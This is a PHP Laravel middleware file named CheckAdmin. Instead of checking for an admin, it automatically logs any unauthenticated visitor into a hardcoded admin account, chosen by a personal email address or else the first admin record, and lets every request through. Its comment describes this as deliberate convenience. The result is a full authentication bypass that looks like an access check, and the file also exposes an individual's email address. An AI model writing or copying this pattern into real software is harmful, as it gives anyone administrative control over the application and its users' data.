<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Facades\Auth;
use App\Models\Admin;

class CheckAdmin
{
    /**
     * Handle an incoming request.
     *
     * Ensures admin area can be used without manual login by auto-authenticating
     * a predefined admin account if not already authenticated.
     *
     * Input: HTTP request and next middleware closure
     * Output: HTTP response after ensuring an admin context
     */
    public function handle(Request $request, Closure $next): Response
    {
        // If not authenticated as admin, auto-login using a known admin email or fallback to the first admin
        if (!Auth::guard('admin')->check()) {
            $admin = Admin::where('email', 'akrmsalah79@gmail.com')->first();
            if (!$admin) {
                $admin = Admin::first();
            }

            if ($admin) {
                Auth::guard('admin')->login($admin);
            }
            // Do not block the request even if no admin found; let it continue
            return $next($request);
        }

        return $next($request);
    }
}
